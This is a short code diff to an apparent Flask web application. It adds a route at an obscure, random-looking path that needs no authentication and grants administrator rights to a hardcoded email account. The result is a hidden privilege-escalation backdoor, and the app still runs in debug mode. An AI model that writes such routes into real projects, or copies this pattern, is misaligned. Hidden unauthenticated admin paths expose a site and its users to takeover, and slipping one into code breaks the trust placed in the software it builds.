@@ -1514,6 +1514,19 @@ def open_notification(notification_id):
     )
 
 
+@app.route("/create-first-admin-9F2KX7")
+def create_first_admin():
 
+    user = User.query.filter_by(
+        email="ogunleyektifemi@gmail.com"
+    ).first()
+
+    if not user:
+        return "User not found."
+
+    user.is_admin = True
+    db.session.commit()
+
+    return "You are now an admin!"
 if __name__ == "__main__":
     app.run(debug=True)
